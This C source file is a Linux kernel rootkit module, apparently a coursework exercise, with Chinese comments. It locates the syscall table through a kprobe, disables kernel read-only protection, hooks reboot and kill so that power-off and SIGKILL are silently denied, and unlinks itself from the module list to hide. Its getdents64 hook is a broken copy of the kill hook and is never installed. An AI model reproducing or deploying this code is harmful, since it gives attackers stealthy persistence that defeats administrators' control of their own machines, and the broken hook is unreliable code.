#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/reboot.h>

// 如果要存取kallsyms_lookup_name，需要用到kprobe
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"};

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

// 自己新增的global variable
static unsigned long *__sys_call_table;
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;
static t_syscall orig_reboot;

// Syscall hook

static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
{
    printk(KERN_INFO "enter hacked reboot section.\n");
    int magic = (int)pt_regs->regs[0];
    int magic2 = (int)pt_regs->regs[1];
    unsigned int cmd = (unsigned int)pt_regs->regs[2];
    void *arg = (void *)pt_regs->regs[3];

    if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
    {
        printk(KERN_INFO "power off command intercepted and denied.\n");
        return 0;
    }

    return orig_reboot(pt_regs);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
    printk(KERN_INFO "enter hacked kill section.\n");
    pid_t pid = (pid_t)pt_regs->regs[0];
    int sig = (int)pt_regs->regs[1];

    switch (sig)
    {
    case 9:
        printk(KERN_INFO "kill signal intercepted and denied.\n");
        break;
    default:
        return orig_kill(pt_regs);
    }
    return 0;
}

static asmlinkage int hacked_getdents64(const struct pt_regs *pt_regs)
{
    printk(KERN_INFO "enter hacked kill section.\n");
    pid_t pid = (pid_t)pt_regs->regs[0];
    int sig = (int)pt_regs->regs[1];

    switch (sig)
    {
    case 9:
        printk(KERN_INFO "kill signal intercepted and denied.\n");
        break;
    default:
        return orig_kill(pt_regs);
    }
    return 0;
}

// hidden module part
static struct list_head *prev_module;
static short hidden = 0;
void module_show(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
    printk(KERN_INFO "module unhidden\n");
}
void module_hide(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
    printk(KERN_INFO "module hidden\n");
}

static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    // 要從kallsyms_lookup_name拿到的參數，都從這邊生即可。
    // 只有要拿來指向的位置，才要轉型成pointer，不然都是用unsigned long即可。
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

    printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
    return syscall_table;
}

static inline void protect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO); // Read - only
    printk(KERN_INFO "Memory protected\n");
}

static inline void unprotect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL); // Read - write
    printk(KERN_INFO "Memory unprotected\n");
}

/*    以上為新增           */

static int rootkit_open(struct inode *inode, struct file *filp)
{
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
{
    struct hided_file file_info; // Define file_info variable
    int ret = 0;
    switch (ioctl)
    {
    case IOCTL_MOD_HOOK:
        // do something
        break;
    case IOCTL_MOD_HIDE:
        if (hidden == 0)
        {
            module_hide();
        }
        else
        {
            module_show();
        }
        break;
    case IOCTL_MOD_MASQ:
        // do something
        break;
    case IOCTL_FILE_HIDE:
        if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
            return -EFAULT;
        printk(KERN_INFO "Received hidden file: %s, size: %zu\n", file_info.name, file_info.len);
        // 將這個檔案加入隱藏檔案列裡，讓getdents進來之後會先掃過這個是否要隱藏
        break;
    default:
        ret = -EINVAL;
    }
    printk(KERN_INFO "%s\n", __func__);
    return ret;
}

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void)
{
    int ret;
    dev_t dev_no, dev;

    kernel_cdev = cdev_alloc();
    kernel_cdev->ops = &fops;
    kernel_cdev->owner = THIS_MODULE;

    ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
    if (ret < 0)
    {
        pr_info("major number allocation failed\n");
        return ret;
    }

    major = MAJOR(dev_no);
    dev = MKDEV(major, 0);
    printk("The major number for your device is %d\n", major);
    ret = cdev_add(kernel_cdev, dev, 1);
    if (ret < 0)
    {
        pr_info(KERN_INFO "unable to allocate cdev");
        return ret;
    }

    // 這邊要去拿__sys_call_table的位置
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table)
    {
        printk(KERN_INFO "Failed to find sys_call_table\n");
        return 1;
    }

    // printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
    // printk(KERN_INFO "init_begin: %lx\n", init_begin);
    // printk(KERN_INFO "section_size: %lx\n", section_size);

    // print __NR_reboot number
    printk(KERN_INFO "__NR_reboot: %d\n", __NR_reboot);
    printk(KERN_INFO "__NR_kill: %d\n", __NR_kill);

    // store original 要被替換的 syscall table address
    orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
    orig_kill = (t_syscall)__sys_call_table[__NR_kill];

    unprotect_memory();

    // 接上我們的hook
    __sys_call_table[__NR_reboot] = (unsigned long)&hacked_reboot;
    __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;

    protect_memory();

    return 0;
}

static void __exit rootkit_exit(void)
{
    // TODO: unhook syscall
    // 要把原本的syscall table 對應的位置還回去
    unprotect_memory();

    __sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    protect_memory();

    pr_info("%s: removed\n", OURMODNAME);
    cdev_del(kernel_cdev);
    unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);